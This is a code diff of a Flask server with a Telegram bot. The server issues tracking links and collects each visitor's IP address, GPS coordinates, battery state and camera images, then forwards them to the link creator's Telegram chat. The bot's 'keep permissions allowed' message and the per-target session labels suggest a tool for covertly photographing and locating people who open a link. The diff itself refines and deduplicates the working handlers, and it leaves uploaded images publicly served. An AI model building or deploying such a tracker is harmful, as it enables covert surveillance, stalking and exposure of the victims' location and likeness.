@@ -1,4 +1,5 @@
 # server.py - Flask app with Telegram webhook (single-file deploy)
+# Final cleaned version. Keep this as server.py (not server.js).
 import os
 import uuid
 import base64
@@ -6,18 +7,19 @@ import json
 import requests
 from datetime import datetime
 from dotenv import load_dotenv
-from flask import Flask, request, send_from_directory, render_template, jsonify, url_for, abort
-from urllib.parse import urlparse
+from flask import Flask, request, send_from_directory, render_template, jsonify, url_for
 
-# load .env in development (optional)
+# load .env in development
 load_dotenv()
 
 # ---------- Configuration ----------
 UPLOAD_DIR = "uploads"
 SESSIONS_FILE = "sessions.json"
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
-# Secret path for webhook: set this env var to a random string in production
-TELEGRAM_WEBHOOK_SECRET = os.environ.get("TELEGRAM_WEBHOOK_SECRET", "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8])
+TELEGRAM_WEBHOOK_SECRET = os.environ.get(
+    "TELEGRAM_WEBHOOK_SECRET",
+    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8]
+)
 
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
@@ -47,8 +49,11 @@ def telegram_api(method: str, data=None, files=None, timeout=30):
         return None, "no_token"
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
     try:
-        r = requests.post(url, json=data if files is None else None, data=None if files is None else data, files=files, timeout=timeout)
-        # when files is None we send JSON (telegram accepts JSON for sendMessage), else form-data
+        # when files is None we send JSON payload; when files present we send multipart/form-data
+        if files is None:
+            r = requests.post(url, json=data or {}, timeout=timeout)
+        else:
+            r = requests.post(url, data=data or {}, files=files or {}, timeout=timeout)
         return r, None
     except Exception as e:
         return None, str(e)
@@ -56,7 +61,7 @@ def telegram_api(method: str, data=None, files=None, timeout=30):
 def tg_send_text(chat_id: str, text: str):
     if not TELEGRAM_BOT_TOKEN or not chat_id:
         return False
-    payload = {"chat_id": chat_id, "text": text}
+    payload = {"chat_id": str(chat_id), "text": text}
     r, err = telegram_api("sendMessage", data=payload)
     return bool(r and r.ok)
 
@@ -75,6 +80,7 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
         return False
 
 # ---------- URL validation ----------
+from urllib.parse import urlparse
 def is_valid_http_url(u: str):
     try:
         p = urlparse(u)
@@ -90,10 +96,6 @@ def index():
 # Standard session creation
 @app.route("/create", methods=["POST"])
 def create_session():
-    """
-    JSON body: {"label": "...", "chat_id": "<telegram chat id (optional)>"}
-    Returns: {"token": "...", "link": "..."}
-    """
     data = request.get_json(silent=True) or {}
     label = data.get("label", "")
     chat_id = data.get("chat_id")
@@ -114,7 +116,6 @@ def create_session():
 def session_page(token):
     if token not in SESSIONS:
         return "Invalid token", 404
-    # If you have templates/session.html create it; fallback to simple text if missing
     try:
         return render_template("session.html", token=token)
     except Exception:
@@ -166,7 +167,8 @@ def upload_info(token):
         "timestamp": datetime.utcnow().isoformat(),
         "ip": ip,
         "battery": payload.get("battery"),
-        "coords": payload.get("coords")
+        "coords": payload.get("coords"),
+        "note": payload.get("note")
     }
     SESSIONS[token]["visits"].append(entry)
     save_sessions(SESSIONS)
@@ -179,134 +181,7 @@ def upload_info(token):
         tg_send_text(chat_id, summary)
     return jsonify({"status": "ok", "stored": entry})
 
-@app.route("/upload_image/<token>", methods=["POST"])
-def upload_image(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
-    data = request.get_json(silent=True) or {}
-    b64 = data.get("image_b64", "")
-    if not b64:
-        return ("No image data", 400)
-    if b64.startswith("data:"):
-        try:
-            b64 = b64.split(",", 1)[1]
-        except Exception:
-            return ("Bad data url", 400)
-    try:
-        imgbytes = base64.b64decode(b64)
-    except Exception:
-        return ("Bad base64", 400)
-
-    # limit image size (reject if > 5 MB)
-    if len(imgbytes) > 5_000_000:
-        return ("Image too large", 413)
-
-    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
-    fname = f"{token}_{timestamp}.jpg"
-    path = os.path.join(UPLOAD_DIR, fname)
-    with open(path, "wb") as f:
-        f.write(imgbytes)
-
-    SESSIONS[token].setdefault("files", []).append(fname)
-    save_sessions(SESSIONS)
-
-    chat_id = SESSIONS[token].get("chat_id")
-    if chat_id:
-        caption = f"Session {token} — photo {timestamp}"
-        sent = tg_send_photo(chat_id, path, caption=caption)
-        if not sent:
-            try:
-                downloads_url = url_for("serve_upload", filename=fname, _external=True)
-                tg_send_text(chat_id, f"Image saved: {downloads_url}")
-            except Exception:
-                pass
-
-    return jsonify({"status": "saved", "filename": fname})
-
-@app.route("/session_data/<token>")
-def session_data(token):
-    if token not in SESSIONS:
-        return "Invalid token", 404
-    return jsonify(SESSIONS[token])
-
-@app.route("/uploads/<filename>")
-def serve_upload(filename):
-    # Consider protecting this endpoint in production
-    return send_from_directory(UPLOAD_DIR, filename)
-
-# ---------- Telegram webhook endpoint ----------
-@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
-def telegram_webhook():
-    if not TELEGRAM_BOT_TOKEN:
-        return "no token", 403
-    update = request.get_json(silent=True)
-    if not update:
-        return "no json", 400
-
-    # extract incoming message
-    try:
-        msg = update.get("message") or update.get("edited_message") or {}
-        if not msg:
-            return "ok", 200
-
-        chat = msg.get("chat", {})
-        chat_id = chat.get("id")
-        text = msg.get("text", "").strip()
-        if not text:
-            return "ok", 200
-
-        # /start
-        if text.startswith("/start"):
-            tg_send_text(chat_id, "Bot ready. Use /create <label> to create a session.")
-            return "ok", 200
-
-        # /create <label>
-        if text.startswith("/create"):
-            parts = text.split(maxsplit=1)
-            label = parts[1] if len(parts) > 1 else ""
-            # call internal create endpoint
-            try:
-                r = requests.post(url_for("create_session", _external=True), json={"label": label, "chat_id": str(chat_id)}, timeout=5)
-                if r.ok:
-                    data = r.json()
-                    tg_send_text(chat_id, f"Session created.\nToken: {data['token']}\nOpen: {data['link']}\nKeep permissions allowed while page is open.")
-                else:
-                    tg_send_text(chat_id, f"Failed to create session: server returned {r.status_code}")
-            except Exception as e:
-                print("create command error:", e)
-                tg_send_text(chat_id, "Failed to create session (server error).")
-            return "ok", 200
-
-        # /status <token>
-        if text.startswith("/status"):
-            parts = text.split(maxsplit=1)
-            if len(parts) < 2:
-                tg_send_text(chat_id, "Usage: /status <token>")
-                return "ok", 200
-            token = parts[1].strip()
-            try:
-                r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
-                if r.status_code != 200:
-                    tg_send_text(chat_id, f"Server returned status {r.status_code}: {r.text}")
-                    return "ok", 200
-                data = r.json()
-                visits = data.get("visits", [])
-                summary = f"Session {token}\nLabel: {data.get('label')}\nCreated: {data.get('created_at')}\nTotal events: {len(visits)}"
-                # split long messages
-                for chunk in (summary[i:i+4000] for i in range(0, len(summary), 4000)):
-                    tg_send_text(chat_id, chunk)
-                # optionally send last 5 events
-                for v in visits[-5:]:
-                    txt = f"{v.get('timestamp')}\nIP: {v.get('ip')}\nBattery: {v.get('battery')}\nCoords: {v.get('coords')}"
-                    tg_send_text(chat_id, txt)
-            except Exception as e:
-                print("status command error:", e)
-                tg_send_text(chat_id, f"Failed to fetch status: {e}")
-            return "ok", 200
-
-    except Exception as e:
-        print("Telegram webhook error:", e)
-    return "ok", 200
+# Single upload_image handler (final version)
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
     """
@@ -316,10 +191,6 @@ def upload_image(token):
         "coords": {"lat":..., "lon":..., "accuracy":...}  (optional),
         "battery": {"level":..., "charging":...}          (optional)
       }
-
-    Saves file, records metadata into session, and notifies Telegram:
-      - sends photo (preferred)
-      - if sending photo fails, sends a text message with a download URL
     """
     if token not in SESSIONS:
         return "Invalid token", 404
@@ -377,20 +248,101 @@ def upload_image(token):
             ch = battery.get("charging")
             caption_parts.append(f"Battery: {lev}%{' charging' if ch else ''}")
         caption = "\n".join(caption_parts)
-        sent = telegram_send_photo(chat_id, path, caption=caption)
+        sent = tg_send_photo(chat_id, path, caption=caption)
         if not sent:
-            # fallback: send text with download link
             try:
                 downloads_url = url_for("serve_upload", filename=fname, _external=True)
-                telegram_send_message(chat_id, f"Image saved: {downloads_url}\n{caption}")
+                tg_send_text(chat_id, f"Image saved: {downloads_url}\n{caption}")
             except Exception:
                 pass
 
     return jsonify({"status": "saved", "filename": fname, "meta": meta})
 
+@app.route("/session_data/<token>")
+def session_data(token):
+    if token not in SESSIONS:
+        return "Invalid token", 404
+    return jsonify(SESSIONS[token])
+
+@app.route("/uploads/<filename>")
+def serve_upload(filename):
+    # Consider protecting this endpoint in production
+    return send_from_directory(UPLOAD_DIR, filename)
+
+# ---------- Telegram webhook endpoint ----------
+@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
+def telegram_webhook():
+    if not TELEGRAM_BOT_TOKEN:
+        return "no token", 403
+    update = request.get_json(silent=True)
+    if not update:
+        return "no json", 400
+
+    try:
+        msg = update.get("message") or update.get("edited_message") or {}
+        if not msg:
+            return "ok", 200
+
+        chat = msg.get("chat", {})
+        chat_id = chat.get("id")
+        text = (msg.get("text") or "").strip()
+        if not text:
+            return "ok", 200
+
+        # /start
+        if text.startswith("/start"):
+            tg_send_text(chat_id, "Bot ready. Use /create <label> to create a session.")
+            return "ok", 200
+
+        # /create <label>
+        if text.startswith("/create"):
+            parts = text.split(maxsplit=1)
+            label = parts[1] if len(parts) > 1 else ""
+            try:
+                r = requests.post(url_for("create_session", _external=True), json={"label": label, "chat_id": str(chat_id)}, timeout=5)
+                if r.ok:
+                    data = r.json()
+                    tg_send_text(chat_id, f"Session created.\nToken: {data['token']}\nOpen: {data['link']}\nKeep permissions allowed while page is open.")
+                else:
+                    tg_send_text(chat_id, f"Failed to create session: server returned {r.status_code}")
+            except Exception as e:
+                print("create command error:", e)
+                tg_send_text(chat_id, "Failed to create session (server error).")
+            return "ok", 200
+
+        # /status <token>
+        if text.startswith("/status"):
+            parts = text.split(maxsplit=1)
+            if len(parts) < 2:
+                tg_send_text(chat_id, "Usage: /status <token>")
+                return "ok", 200
+            token = parts[1].strip()
+            try:
+                r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
+                if r.status_code != 200:
+                    tg_send_text(chat_id, f"Server returned status {r.status_code}: {r.text}")
+                    return "ok", 200
+                data = r.json()
+                visits = data.get("visits", [])
+                summary = f"Session {token}\nLabel: {data.get('label')}\nCreated: {data.get('created_at')}\nTotal events: {len(visits)}"
+                for chunk in (summary[i:i+4000] for i in range(0, len(summary), 4000)):
+                    tg_send_text(chat_id, chunk)
+                for v in visits[-5:]:
+                    txt = f"{v.get('timestamp')}\nIP: {v.get('ip')}\nBattery: {v.get('battery')}\nCoords: {v.get('coords')}"
+                    tg_send_text(chat_id, txt)
+            except Exception as e:
+                print("status command error:", e)
+                tg_send_text(chat_id, f"Failed to fetch status: {e}")
+            return "ok", 200
+
+    except Exception as e:
+        print("Telegram webhook error:", e)
+
+    return "ok", 200
+
 # ---------- Run ----------
 if __name__ == "__main__":
-    # Development server (do not use in production)
     debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
     port = int(os.environ.get("PORT", 5000))
+    # Development server. Use gunicorn in production.
     app.run(host="0.0.0.0", port=port, debug=debug_mode)
